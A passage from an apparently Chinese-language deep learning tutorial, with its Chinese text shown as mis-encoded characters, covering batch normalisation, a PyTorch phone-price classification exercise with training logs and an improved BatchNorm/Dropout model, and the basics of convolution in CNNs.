output = dropout(M) # å¤±æ´» BNå±‚ï¼ˆå°æ‰¹é‡å½’ä¸€åŒ–ï¼‰ BNå±‚æ€æƒ³ï¼šBNå±‚ä½äºç¥ç»å…ƒä¸­æ±‚å’Œè®¡ç®—ä¸éçº¿æ€§è®¡ç®—ä¹‹é—´ï¼Œå³ $$\\displaystyle{Input\\overset{x}{\\rightarrow}\\left(\\sum\\overset{s_1}{\\rightarrow} \\mathcal{BN}\\overset{s_2}{\\rightarrow} f(s_2) \\right)\\rightarrow Output}$$ï¼Œå¯¹ $s_1$ è¿›è¡Œå°æ‰¹é‡çš„å½’ä¸€åŒ–ä¸å¹³ç§»ç¼©æ”¾ï¼Œæ•°æ®èŒƒå›´ä¸ºè¯¥æ‰¹æ¬¡çš„è¾“å…¥æ•°æ® $\\mathcal{BN}$ å±‚å®ç°ï¼š $$\\displaystyle{s_2 =\\lambdaÂ·\\left(\\frac{ s_1 - \\mu_B}{\\sqrt{\\sigma^2_B+\\epsilon}}\\right)+\\beta} $$ $\\lambda$ ï¼ˆç³»æ•°ï¼‰å’Œ $\\beta$ ï¼ˆåç½®ï¼‰ä¸ºå¯å­¦ä¹ å‚æ•°ï¼Œç›¸å½“äºå¯¹æ ‡å‡†åŒ–åçš„å€¼åšä¸€æ¬¡çº¿æ€§å˜æ¢ $ \\epsilon $ é€šå¸¸å– $ 1e-5 $ ï¼Œé¿å…åˆ†æ¯ä¸º $ 0 $ $ \\mu_B $ ä¸ºè¯¥æ‰¹æ¬¡æ ·æœ¬å‡å€¼ï¼Œ $ \\mu_B = \\displaystyle{\\frac{1}{m}\\sum^m_{i=1}x_i} $ ï¼Œ $ m $ ä¸ºè¯¥æ‰¹æ¬¡æ ·æœ¬æ•° $ \\sigma^2_B $ ä¸ºè¯¥æ‰¹æ¬¡æ ·æœ¬æ–¹å·®ï¼Œ $ \\sigma^2_B = \\displaystyle{\\frac{1}{m}\\sum^m_{i=1}(x_i-\\mu_B)^2} $ å®è·µâ€”â€”æ‰‹æœºä»·æ ¼åˆ†ç±»é¢„æµ‹ å¯¼å…¥å·¥å…·åŒ… 1 2 3 4 5 6 7 8 9 10 11 import torch import torch.nn as nn import torch.optim as optim from torch.utils.data import TensorDataset,DataLoader from torchsummary import summary from sklearn.datasets import make_regression from sklearn.model_selection import train_test_split import matplotlib.pyplot as plt import numpy as np import pandas as pd import time æ•°æ®åŠ è½½ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 def load_data(): # æ•°æ®è¯»å– data_path = \u0026#39;./Dataset/4_Phone_Price_Predict/phone_price_dataset.csv\u0026#39; data = pd.read_csv(data_path) X,y = data.iloc[:,:-1],data.iloc[:,-1] # æ•°æ®åˆ’åˆ† X_train,X_test,y_train,y_test = train_test_split( X,y, train_size=0.8, random_state=428, stratify=y ) # è½¬ä¸ºDatasetå¯¹è±¡ train_dataset = TensorDataset( torch.from_numpy(X_train.values).float(), torch.from_numpy(y_train.values).long(), ) test_dataset = TensorDataset( torch.from_numpy(X_test.values).float(), torch.from_numpy(y_test.values).long(), ) return train_dataset,test_dataset,X.shape[1],len(np.unique(y)),X.columns,y.name æ„å»ºæ¨¡å‹ 1 2 3 4 5 6 7 8 9 10 11 12 class PhonePriceModel(nn.Module): def __init__(self,in_dim,out_dim): super(PhonePriceModel,self).__init__() self.linear_in_h1 = nn.Linear(in_dim,128) self.linear_h1_h2 = nn.Linear(128,256) self.linear_h2_out = nn.Linear(256,out_dim) def forward(self,X): X = torch.tanh(self.linear_in_h1(X)) X = torch.relu(self.linear_h1_h2(X)) return self.linear_h2_out(X) def predict(self,X): return torch.argmax(self.forward(X),dim=1) æ¨¡å‹è®­ç»ƒ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 def train_model(model,train_data_loader,epochs=1000,device=\u0026#39;cuda\u0026#39;): # å‡†åˆ™ï¼šæŸå¤±å‡½æ•°â€”â€”äº¤å‰ç†µ criterion = nn.CrossEntropyLoss() # ä¼˜åŒ–æ–¹æ³• optimizer = optim.SGD(model.parameters(),lr=0.001,momentum=0.9) model.to(device) # å°†æ¨¡å‹æ¬åˆ°gpu total_start = time.time() round_start = time.time() best = {\u0026#39;model\u0026#39;:model,\u0026#39;loss\u0026#39;:10.} for epoch in range(epochs): # è¿­ä»£ total_loss = 0 total = 0 for batch_index,(X,y) in enumerate(train_data_loader): X,y = X.to(device),y.to(device) optimizer.zero_grad() # æ¢¯åº¦æ¸…é›¶ y_hat = model.forward(X) # å‰å‘ä¼ æ’­ loss = criterion(y_hat,y) # è®¡ç®—æŸå¤± loss.backward() # åå‘ä¼ æ’­ optimizer.step() total_loss += loss.item() total += 1 if total_loss/total \u0026lt; best[\u0026#39;loss\u0026#39;]: best[\u0026#39;model\u0026#39;] = model else: print(\u0026#34;Model degradation!\u0026#34;) if epoch % 100 == 0: print(f\u0026#34;epoch[{epoch}] | AVG_Loss:={total_loss/total:0.5f} | round_time = {time.time()-round_start:0.3}s | total_time = {time.time()-total_start:0.3}s\u0026#34;) round_start = time.time() torch.save(best[\u0026#39;model\u0026#39;].state_dict(),\u0026#39;./Model/4_Phone_Price_Predict/Model.pth\u0026#39;) æ¨¡å‹è¯„ä¼° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 def evaluate_model(train_data_loader,test_data_loader,in_dim,out_dim): # åŠ è½½æ¨¡å‹ model = PhonePriceModel(in_dim,out_dim) model.load_state_dict(torch.load(\u0026#39;./Model/4_Phone_Price_Predict/Model.pth\u0026#39;,weights_only=True)) correct = 0 total = 0 for batch_index,(X,y) in enumerate(train_data_loader ): y_hat = model.predict(X) correct += (y_hat==y).sum() total += len(y) print(f\u0026#34;TRAIN-ACC: {100*(correct/total).item():.2f}%\u0026#34;) correct = 0 total = 0 for batch_index,(X,y) in enumerate(test_data_loader): y_hat = model.predict(X) correct += (y_hat==y).sum() total += len(y) print(f\u0026#34;TEST-ACC: {100*(correct/total).item():.2f}%\u0026#34;) evaluate_model(train_data_loader,test_data_loader,features_num,categories_num) # è¿­ä»£äº†ä¸€ä¸‡æ¬¡å°±è¿™ä¸ªç»“æœ # TRAIN-ACC: 68.81% # TEST-ACC: 57.50% TRAIN-ACC: 68.81% TEST-ACC: 57.50% ç¨‹åºå…¥å£ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 if __name__==\u0026#34;__main__\u0026#34;: # 0ã€é¢„å‡†å¤‡ torch.manual_seed(20030428) device = torch.device(\u0026#39;cuda\u0026#39; if torch.cuda.is_available else \u0026#39;cpu\u0026#39;) # 1ã€æ•°æ®é›†åŠ è½½ train_dataset,test_dataset,features_num,categories_num,_,_= load_data() train_data_loader = DataLoader( dataset=train_dataset, batch_size=1600, shuffle=True, ) test_data_loader = DataLoader( dataset=test_dataset, batch_size=10, shuffle=False, ) # 2ã€æ„å»ºæ¨¡å‹ model = PhonePriceModel(features_num,categories_num) print(\u0026#34;Model structure and parameter statistics:\u0026#34;) summary(model,input_size=(features_num,),batch_size=train_data_loader.batch_size,device=\u0026#39;cpu\u0026#39;) # 3ã€æ¨¡å‹è®­ç»ƒ train_model(model,train_data_loader,epochs=10000,device=device) # 4ã€æ¨¡å‹è¯„ä¼° # evaluate_model(train_data_loader,features_num,categories_num) Model structure and parameter statistics: ---------------------------------------------------------------- Layer (type) Output Shape Param # ================================================================ Linear-1 [1600, 128] 2,688 Linear-2 [1600, 256] 33,024 Linear-3 [1600, 4] 1,028 ================================================================ Total params: 36,740 Trainable params: 36,740 Non-trainable params: 0 ---------------------------------------------------------------- Input size (MB): 0.12 Forward/backward pass size (MB): 4.74 Params size (MB): 0.14 Estimated Total Size (MB): 5.00 ---------------------------------------------------------------- epoch[0] | AVG_Loss:=1.43993 | round_time = 0.0259s | total_time = 0.0259s epoch[100] | AVG_Loss:=1.02807 | round_time = 2.17s | total_time = 2.19s epoch[200] | AVG_Loss:=0.97904 | round_time = 2.84s | total_time = 5.03s epoch[300] | AVG_Loss:=0.95448 | round_time = 2.11s | total_time = 7.14s epoch[400] | AVG_Loss:=0.93392 | round_time = 2.17s | total_time = 9.32s epoch[500] | AVG_Loss:=0.91720 | round_time = 2.62s | total_time = 11.9s epoch[600] | AVG_Loss:=0.90214 | round_time = 2.28s | total_time = 14.2s epoch[700] | AVG_Loss:=0.88572 | round_time = 2.23s | total_time = 16.5s epoch[800] | AVG_Loss:=0.87118 | round_time = 2.1s | total_time = 18.6s epoch[900] | AVG_Loss:=0.85428 | round_time = 2.48s | total_time = 21.0s epoch[1000] | AVG_Loss:=0.81790 | round_time = 2.39s | total_time = 23.4s epoch[1100] | AVG_Loss:=0.79489 | round_time = 2.24s | total_time = 25.7s epoch[1200] | AVG_Loss:=0.75626 | round_time = 2.48s | total_time = 28.1s epoch[1300] | AVG_Loss:=0.73721 | round_time = 2.29s | total_time = 30.4s epoch[1400] | AVG_Loss:=0.73688 | round_time = 2.27s | total_time = 32.7s epoch[1500] | AVG_Loss:=0.75798 | round_time = 2.19s | total_time = 34.9s epoch[1600] | AVG_Loss:=0.73144 | round_time = 2.56s | total_time = 37.4s epoch[1700] | AVG_Loss:=0.74993 | round_time = 2.28s | total_time = 39.7s epoch[1800] | AVG_Loss:=0.73117 | round_time = 2.37s | total_time = 42.1s epoch[1900] | AVG_Loss:=0.73371 | round_time = 2.53s | total_time = 44.6s epoch[2000] | AVG_Loss:=0.75547 | round_time = 2.24s | total_time = 46.9s epoch[2100] | AVG_Loss:=0.75855 | round_time = 2.33s | total_time = 49.2s epoch[2200] | AVG_Loss:=0.74142 | round_time = 2.24s | total_time = 51.4s epoch[2300] | AVG_Loss:=0.77747 | round_time = 2.45s | total_time = 53.9s epoch[2400] | AVG_Loss:=0.73235 | round_time = 2.13s | total_time = 56.0s epoch[2500] | AVG_Loss:=0.77216 | round_time = 2.22s | total_time = 58.2s epoch[2600] | AVG_Loss:=0.79436 | round_time = 2.61s | total_time = 60.8s epoch[2700] | AVG_Loss:=0.70371 | round_time = 2.15s | total_time = 63.0s epoch[2800] | AVG_Loss:=0.72711 | round_time = 2.2s | total_time = 65.2s epoch[2900] | AVG_Loss:=0.79875 | round_time = 2.37s | total_time = 67.6s epoch[3000] | AVG_Loss:=0.77671 | round_time = 2.16s | total_time = 69.7s epoch[3100] | AVG_Loss:=0.74079 | round_time = 2.42s | total_time = 72.1s epoch[3200] | AVG_Loss:=0.77159 | round_time = 2.16s | total_time = 74.3s epoch[3300] | AVG_Loss:=0.74570 | round_time = 2.55s | total_time = 76.9s epoch[3400] | AVG_Loss:=0.74661 | round_time = 2.29s | total_time = 79.1s epoch[3500] | AVG_Loss:=0.73534 | round_time = 2.11s | total_time = 81.3s epoch[3600] | AVG_Loss:=0.73651 | round_time = 2.17s | total_time = 83.4s epoch[3700] | AVG_Loss:=0.70549 | round_time = 2.32s | total_time = 85.8s epoch[3800] | AVG_Loss:=0.72406 | round_time = 2.55s | total_time = 88.3s epoch[3900] | AVG_Loss:=0.73777 | round_time = 2.28s | total_time = 90.6s epoch[4000] | AVG_Loss:=0.72636 | round_time = 2.23s | total_time = 92.8s epoch[4100] | AVG_Loss:=0.72083 | round_time = 2.62s | total_time = 95.4s epoch[4200] | AVG_Loss:=0.76240 | round_time = 2.32s | total_time = 97.7s epoch[4300] | AVG_Loss:=0.72299 | round_time = 2.28s | total_time = 1e+02s epoch[4400] | AVG_Loss:=0.72510 | round_time = 2.2s | total_time = 1.02e+02s epoch[4500] | AVG_Loss:=0.81183 | round_time = 2.7s | total_time = 1.05e+02s epoch[4600] | AVG_Loss:=0.80652 | round_time = 2.24s | total_time = 1.07e+02s epoch[4700] | AVG_Loss:=0.75615 | round_time = 2.2s | total_time = 1.09e+02s epoch[4800] | AVG_Loss:=0.74941 | round_time = 2.1s | total_time = 1.11e+02s epoch[4900] | AVG_Loss:=0.66527 | round_time = 2.52s | total_time = 1.14e+02s epoch[5000] | AVG_Loss:=0.67272 | round_time = 2.4s | total_time = 1.16e+02s epoch[5100] | AVG_Loss:=0.69575 | round_time = 2.28s | total_time = 1.19e+02s epoch[5200] | AVG_Loss:=0.73091 | round_time = 2.43s | total_time = 1.21e+02s epoch[5300] | AVG_Loss:=0.73123 | round_time = 2.38s | total_time = 1.23e+02s epoch[5400] | AVG_Loss:=0.71328 | round_time = 2.45s | total_time = 1.26e+02s epoch[5500] | AVG_Loss:=0.73237 | round_time = 2.21s | total_time = 1.28e+02s epoch[5600] | AVG_Loss:=0.69641 | round_time = 2.46s | total_time = 1.31e+02s epoch[5700] | AVG_Loss:=0.68606 | round_time = 2.3s | total_time = 1.33e+02s epoch[5800] | AVG_Loss:=0.78586 | round_time = 2.34s | total_time = 1.35e+02s epoch[5900] | AVG_Loss:=0.72079 | round_time = 2.49s | total_time = 1.38e+02s epoch[6000] | AVG_Loss:=0.69734 | round_time = 2.15s | total_time = 1.4e+02s epoch[6100] | AVG_Loss:=0.68501 | round_time = 2.36s | total_time = 1.42e+02s epoch[6200] | AVG_Loss:=0.71024 | round_time = 2.26s | total_time = 1.45e+02s epoch[6300] | AVG_Loss:=0.70844 | round_time = 2.48s | total_time = 1.47e+02s epoch[6400] | AVG_Loss:=0.71109 | round_time = 2.15s | total_time = 1.49e+02s epoch[6500] | AVG_Loss:=0.71105 | round_time = 2.34s | total_time = 1.51e+02s epoch[6600] | AVG_Loss:=0.69019 | round_time = 2.67s | total_time = 1.54e+02s epoch[6700] | AVG_Loss:=0.66574 | round_time = 2.27s | total_time = 1.56e+02s epoch[6800] | AVG_Loss:=0.70853 | round_time = 2.23s | total_time = 1.59e+02s epoch[6900] | AVG_Loss:=0.68988 | round_time = 2.46s | total_time = 1.61e+02s epoch[7000] | AVG_Loss:=0.70364 | round_time = 2.56s | total_time = 1.64e+02s epoch[7100] | AVG_Loss:=0.68664 | round_time = 2.19s | total_time = 1.66e+02s epoch[7200] | AVG_Loss:=0.70823 | round_time = 2.2s | total_time = 1.68e+02s epoch[7300] | AVG_Loss:=0.68428 | round_time = 2.58s | total_time = 1.71e+02s epoch[7400] | AVG_Loss:=0.68428 | round_time = 2.3s | total_time = 1.73e+02s epoch[7500] | AVG_Loss:=0.67769 | round_time = 2.25s | total_time = 1.75e+02s epoch[7600] | AVG_Loss:=0.71397 | round_time = 2.24s | total_time = 1.77e+02s epoch[7700] | AVG_Loss:=0.68235 | round_time = 2.43s | total_time = 1.8e+02s epoch[7800] | AVG_Loss:=0.67531 | round_time = 2.45s | total_time = 1.82e+02s epoch[7900] | AVG_Loss:=0.71229 | round_time = 2.16s | total_time = 1.84e+02s epoch[8000] | AVG_Loss:=0.69479 | round_time = 2.52s | total_time = 1.87e+02s epoch[8100] | AVG_Loss:=0.67552 | round_time = 2.37s | total_time = 1.89e+02s epoch[8200] | AVG_Loss:=0.67883 | round_time = 2.31s | total_time = 1.92e+02s epoch[8300] | AVG_Loss:=0.67391 | round_time = 2.28s | total_time = 1.94e+02s epoch[8400] | AVG_Loss:=0.66348 | round_time = 2.26s | total_time = 1.96e+02s epoch[8500] | AVG_Loss:=0.70879 | round_time = 2.78s | total_time = 1.99e+02s epoch[8600] | AVG_Loss:=0.70171 | round_time = 2.2s | total_time = 2.01e+02s epoch[8700] | AVG_Loss:=0.69648 | round_time = 2.2s | total_time = 2.03e+02s epoch[8800] | AVG_Loss:=0.71258 | round_time = 2.58s | total_time = 2.06e+02s epoch[8900] | AVG_Loss:=0.67976 | round_time = 2.44s | total_time = 2.08e+02s epoch[9000] | AVG_Loss:=0.69145 | round_time = 2.22s | total_time = 2.11e+02s epoch[9100] | AVG_Loss:=0.71203 | round_time = 2.17s | total_time = 2.13e+02s epoch[9200] | AVG_Loss:=0.72272 | round_time = 2.61s | total_time = 2.15e+02s epoch[9300] | AVG_Loss:=0.69372 | round_time = 2.31s | total_time = 2.18e+02s epoch[9400] | AVG_Loss:=0.69941 | round_time = 2.2s | total_time = 2.2e+02s epoch[9500] | AVG_Loss:=0.70574 | round_time = 2.13s | total_time = 2.22e+02s epoch[9600] | AVG_Loss:=0.73976 | round_time = 2.55s | total_time = 2.25e+02s epoch[9700] | AVG_Loss:=0.68331 | round_time = 2.39s | total_time = 2.27e+02s epoch[9800] | AVG_Loss:=0.71937 | round_time = 2.19s | total_time = 2.29e+02s epoch[9900] | AVG_Loss:=0.72435 | round_time = 2.47s | total_time = 2.32e+02s å®è·µï¼ˆæ”¹è¿›ï¼‰â€”â€”æ‰‹æœºä»·æ ¼åˆ†ç±»é¢„æµ‹ å·¥å…·å¯¼å…¥ 1 2 3 4 5 6 7 8 9 10 11 import torch import torch.nn as nn import torch.optim as optim from torch.utils.data import TensorDataset,DataLoader from torchsummary import summary from sklearn.datasets import make_regression from sklearn.model_selection import train_test_split import matplotlib.pyplot as plt import numpy as np import pandas as pd import time æ•°æ®åŠ è½½ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 def load_data(): # æ•°æ®è¯»å– data_path = \u0026#39;./Dataset/4_Phone_Price_Predict/phone_price_dataset.csv\u0026#39; data = pd.read_csv(data_path) X,y = data.iloc[:,:-1],data.iloc[:,-1] # æ•°æ®åˆ’åˆ† X_train,X_test,y_train,y_test = train_test_split( X,y, train_size=0.8, random_state=428, stratify=y ) # è½¬ä¸ºDatasetå¯¹è±¡ train_dataset = TensorDataset( torch.from_numpy(X_train.values).float(), torch.from_numpy(y_train.values).long(), ) test_dataset = TensorDataset( torch.from_numpy(X_test.values).float(), torch.from_numpy(y_test.values).long(), ) return train_dataset,test_dataset,X.shape[1],len(np.unique(y)),X.columns,y.name æ¨¡å‹æ„å»º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class PhonePriceModel(nn.Module): def __init__(self,in_dim,out_dim): super(PhonePriceModel,self).__init__() self.network = nn.Sequential( nn.Linear(in_dim,128), nn.BatchNorm1d(128), # BNå±‚â€”â€”æ‰¹å½’ä¸€åŒ– nn.ReLU(), nn.Dropout(0.3), # nn.Linear(128,256), nn.BatchNorm1d(256), nn.ReLU(), nn.Dropout(0.3), nn.Linear(256,128), nn.BatchNorm1d(128), nn.ReLU(), nn.Dropout(0.3), nn.Linear(128,out_dim) ) def forward(self,X): return self.network(X) def predict(self,X): return torch.argmax(self.forward(X),dim=1) æ¨¡å‹è®­ç»ƒ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 def train_model(model,train_data_loader,test_data_loader,epochs=1000,device=\u0026#39;cuda\u0026#39;): criterion = nn.CrossEntropyLoss() optimizer = optim.Adam(model.parameters(),lr=0.001) scheduler = optim.lr_scheduler.StepLR(optimizer,step_size=50,gamma=0.1) model.to(device) total_start = time.time() round_start = time.time() losses = [] train_accs = [] test_accs = [] for epoch in range(epochs): model.train() total_loss = 0 total = 0 for batch_index,(X,y) in enumerate(train_data_loader): X,y = X.to(device),y.to(device) optimizer.zero_grad() y_hat = model(X) loss = criterion(y_hat,y) loss.backward() optimizer.step() total_loss+=loss.item() total+=1 scheduler.step() acc_train = evaluate_accuracy(model,train_data_loader,device) acc_test = evaluate_accuracy(model,test_data_loader,device) losses.append(total_loss/total) train_accs.append(acc_train) test_accs.append(acc_test) if epoch % 10 == 0: print(f\u0026#34;Epoch[{epoch}]:: | Acc on Train:{acc_train:6.3f}% | Acc on Test:{acc_test:6.3f}% | \u0026#34; f\u0026#34;Loss: {total_loss/total:.5f} | total_time: {time.time()-total_start:.3}s\u0026#34;) torch.save(model.state_dict(),\u0026#39;./Model/4_Phone_Price_Predict/Model_improved.pth\u0026#39;) return losses,train_accs,test_accs æ¨¡å‹è¯„ä¼° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 def evaluate_accuracy(model, data_loader, device): model.eval() correct = 0 total = 0 with torch.no_grad(): for X,y in data_loader: X,y = X.to(device),y.to(device) y_hat = model.predict(X) correct += (y==y_hat).sum() total+=len(y) return 100*correct/total def evaluate_model(train_loader, test_loader, in_dim, out_dim, device): model = PhonePriceModel(in_dim,out_dim) model.load_state_dict(torch.load(\u0026#39;./Model/4_Phone_Price_Predict/Model_improved.pth\u0026#39;, weights_only=True)) model.to(device) acc_train = evaluate_accuracy(model,train_loader,device) acc_test = evaluate_accuracy(model,test_loader,device) print(f\u0026#34;Training set accuracy rate: {acc_train:6.3f}%\u0026#34;) print(f\u0026#34;Training set accuracy rate: {acc_test:6.3f}%\u0026#34;) evaluate_model(train_data_loader,test_data_loader,features_num,categories_num,device) Training set accuracy rate: 98.062% Training set accuracy rate: 98.750% å‡½æ•°å…¥å£ 1 2 3 # é¢„å‡†å¤‡ torch.manual_seed(20030428) device = torch.device(\u0026#39;cuda\u0026#39; if torch.cuda.is_available else \u0026#39;cpu\u0026#39;) 1 2 3 4 5 6 7 8 9 10 11 12 # æ•°æ®åŠ è½½ train_dataset,test_dataset,features_num,categories_num,_,_= load_data() train_data_loader = DataLoader( dataset=train_dataset, batch_size=400, shuffle=True, ) test_data_loader = DataLoader( dataset=test_dataset, batch_size=10, shuffle=False, ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 torch.manual_seed(20030428) # æ„å»ºæ¨¡å‹ model = PhonePriceModel(features_num,categories_num) print(\u0026#34;Model structure and parameter statistics:\u0026#34;) summary(model,input_size=(features_num,),batch_size=train_data_loader.batch_size,device=\u0026#39;cpu\u0026#39;) # æ¨¡å‹è®­ç»ƒ losses,train_acc,test_acc = train_model(model,train_data_loader,test_data_loader,epochs=110,device=device) # å›¾åƒç»˜åˆ¶ figs,axes = plt.subplots(1,2,figsize=(12,4)) axes[0].plot(range(len(losses)),losses,label=\u0026#39;loss\u0026#39;) axes[0].set_ylabel(\u0026#39;loss\u0026#39;) axes[0].set_xlabel(\u0026#39;epoch\u0026#39;) axes[0].legend() axes[1].plot(range(len(losses)),[item.detach().item() for item in train_acc],label=\u0026#39;train_acc\u0026#39;) axes[1].plot(range(len(losses)),[item.detach().item() for item in test_acc],label=\u0026#39;test_acc\u0026#39;) axes[1].set_ylabel(\u0026#39;acc_rate\u0026#39;) axes[1].set_xlabel(\u0026#39;epoch\u0026#39;) axes[1].legend() plt.tight_layout() plt.show() Model structure and parameter statistics: ---------------------------------------------------------------- Layer (type) Output Shape Param # ================================================================ Linear-1 [400, 128] 2,688 BatchNorm1d-2 [400, 128] 256 ReLU-3 [400, 128] 0 Dropout-4 [400, 128] 0 Linear-5 [400, 256] 33,024 BatchNorm1d-6 [400, 256] 512 ReLU-7 [400, 256] 0 Dropout-8 [400, 256] 0 Linear-9 [400, 128] 32,896 BatchNorm1d-10 [400, 128] 256 ReLU-11 [400, 128] 0 Dropout-12 [400, 128] 0 Linear-13 [400, 4] 516 ================================================================ Total params: 70,148 Trainable params: 70,148 Non-trainable params: 0 ---------------------------------------------------------------- Input size (MB): 0.03 Forward/backward pass size (MB): 6.26 Params size (MB): 0.27 Estimated Total Size (MB): 6.56 ---------------------------------------------------------------- Epoch[0]:: | Acc on Train:31.812% | Acc on Test:30.750% | Loss: 1.22177 | total_time: 0.0878s Epoch[10]:: | Acc on Train:90.625% | Acc on Test:89.750% | Loss: 0.27893 | total_time: 0.867s Epoch[20]:: | Acc on Train:95.625% | Acc on Test:96.250% | Loss: 0.18210 | total_time: 1.64s Epoch[30]:: | Acc on Train:96.938% | Acc on Test:97.250% | Loss: 0.19135 | total_time: 2.39s Epoch[40]:: | Acc on Train:97.688% | Acc on Test:97.000% | Loss: 0.14767 | total_time: 3.14s Epoch[50]:: | Acc on Train:98.188% | Acc on Test:98.250% | Loss: 0.16465 | total_time: 3.91s Epoch[60]:: | Acc on Train:98.125% | Acc on Test:98.000% | Loss: 0.13739 | total_time: 4.66s Epoch[70]:: | Acc on Train:98.000% | Acc on Test:97.500% | Loss: 0.13017 | total_time: 5.42s Epoch[80]:: | Acc on Train:98.125% | Acc on Test:98.250% | Loss: 0.13842 | total_time: 6.22s Epoch[90]:: | Acc on Train:98.250% | Acc on Test:98.000% | Loss: 0.12420 | total_time: 7.27s Epoch[100]:: | Acc on Train:98.062% | Acc on Test:98.750% | Loss: 0.14180 | total_time: 8.12s å·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰ å›¾åƒåŸºç¡€ RGB:[channel,hight,width]/[hight,width,channel] Channel:R/G/B å·ç§¯ç¥ç»ç½‘ç»œç»“æ„ å·ç§¯å±‚ï¼ˆConvï¼‰ï¼šè´Ÿè´£æå–å›¾åƒä¸­çš„å±€éƒ¨ç‰¹å¾ æ± åŒ–å±‚ï¼ˆPoolï¼‰ï¼šç”¨æ¥å¤§å¹…é™ä½å‚æ•°æ•°é‡çº§ï¼ˆé™ç»´ï¼‰ å…¨è¿æ¥å±‚ï¼ˆFCï¼‰ï¼šè¾“å‡ºç»“æœ å·ç§¯å±‚ï¼šç‰¹å¾æå– å·ç§¯è®¡ç®—æ–¹å¼ï¼š å•é€šé“å·ç§¯å±‚è®¡ç®—è¿‡ç¨‹ï¼š$$output = input \\otimes conv$$ï¼Œ $conv$ ç§°ä¸ºå·ç§¯æ ¸ï¼ˆConvolutional Kernelï¼‰ï¼Œä¹Ÿå«æ»¤æ³¢å™¨ï¼ˆFliterï¼‰ å•å±‚å·ç§¯å±‚ç§»æ­¥å¤§å°ä¸ºè¶…å‚æ•°ï¼Œå¯ä»¥è‡ªè¡Œè®¾ç½®ã€‚å½“ç§»æ­¥ä¸ä¸º1æ—¶ï¼Œå¯ä»¥åœ¨åŸè¾“å…¥çŸ©é˜µå››å‘¨è¿›è¡Œå¡«å……0 è®¡ç®—è¿‡ç¨‹ï¼šå°†è¾“å…¥çŸ©é˜µçš„å­çŸ©é˜µä¸å·ç§¯æ ¸è¿›è¡Œé€å…ƒç´ ç›¸ä¹˜å†ç›¸åŠ ï¼Œå¾—åˆ°è¾“å‡ºçŸ©é˜µçš„å¯¹åº”å…ƒç´  æ•°å­¦å…¬å¼ï¼š$$\\displaystyle{Output_{[i,j]} = \\sum_{m=0}^{k-1}\\sum_{n=0}^{k-1}Kernel_{[m,n]}Â·Input_{[i+m,j+n]}}$$ å›¾ç¤ºï¼ˆåˆ†åˆ«ä¸º[Step=1,NoPadding]ä¸[Step=2,Padding]ï¼Œè¿™é‡Œçš„$\\times$ä¸ºé€å…ƒç´ ç›¸ä¹˜ï¼‰ï¼š å¤šé€šé“å·ç§¯å±‚è®¡ç®—è¿‡ç¨‹ï¼š åˆ†åˆ«å¯¹æ¯ä¸ªé€šé“è¿›è¡Œå·ç§¯è®¡ç®—ã€‚è·å¾—ä¸€ä¸ªä¸‰é€šé“çš„ä¸­é—´è®¡ç®—ç»“æœ å°†ä¸‰é€šé“ä¸­é—´è®¡ç®—ç»“æœå¯¹åº”ä½ç½®åŠ å’Œï¼Œå¾—åˆ°å•é€šé“æœ€ç»ˆç»“æœ å›¾ç¤ºï¼ˆo11=or11+og11+ob11ï¼‰ï¼š å¤šé€šé“è¾“å…¥ä¸å¤šé€šé“è¾“å‡º å¤šé€šé“è¾“å‡ºéœ€å¤šå·ç§¯æ ¸åˆ†åˆ«è¿›è¡Œå·ç§¯è®¡ç®—åç»“æœå †å  å›¾ç¤ºï¼š å‚æ•°å¯¹åº”å…³ç³»ï¼š è¾“å…¥å›¾åƒå¤§å°ï¼š$I\\times I$ å·ç§¯æ ¸å¤§å°ï¼š$C\\times C$ ï¼Œ$C$ ä¸€èˆ¬ä¸ºå¥‡æ•° æ­¥é•¿ï¼š$S$ å¡«å……åœˆï¼š$P$ ï¼Œ0å¡«å…… è¾“å‡ºç»“æœå¤§å°ï¼š $O\\times O$ï¼Œå…¶ä¸­ $$\\displaystyle{O = 1+\\frac{I-C+2P}{S}}$$ Pytorch å¸¸ç”¨ï¼štorch.nn.ConvXd(in_channel,out_channel,kernel_size,stride,padding)ï¼Œå…¶ä¸­Xä¸º1ï¼Œ2ï¼Œ3 Con1dï¼šæ»‘åŠ¨ç»´åº¦1ï¼Œæ ¸å½¢çŠ¶ä¸º$(c,)$ï¼Œç”¨äºæ–‡æœ¬/è¯­éŸ³/æ—¶åºæ•°æ®ã€‚ä¸»è¦é¢†åŸŸï¼šNLP/ä¿¡å·å¤„ç† Con2dï¼šæ»‘åŠ¨ç»´åº¦2ï¼Œæ ¸å½¢çŠ¶ä¸º$(c,c)$ï¼Œç”¨äºå›¾åƒ/è§†é¢‘æ•°æ®ã€‚ä¸»è¦é¢†åŸŸï¼šNLP/ä¿¡å·å¤„ç† Con3dï¼šæ»‘åŠ¨ç»´åº¦3ï¼Œæ ¸å½¢çŠ¶ä¸º$(c,c,c)$ï¼Œç”¨äºåŒ»å­¦ä½“æ•°æ®/è§†é¢‘ä½“ç§¯ã€‚ä¸»è¦é¢†åŸŸï¼šåŒ»ç–—å½±åƒ/è§†é¢‘åˆ†æ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import torch import torch.nn as nn import numpy as np import matplotlib.pyplot as plt # å›¾åƒè¯»å–ä¸matplotlibç»˜åˆ¶ img = plt.imread(\u0026#39;./Material/CNN/test01.jpg\u0026#39;) print(type(img),img.shape) plt.subplot(1,2,1) plt.imshow(img) plt.axis(\u0026#39;off\u0026#39;) # åˆ›å»ºå·ç§¯å±‚ conv = nn.Conv2d(in_channels=3,out_channels=2,kernel_size=5,stride=2,padding=0) # pltçš„å›¾åƒè¯»å–é¡ºåºä¸º [hight,width,channel] # 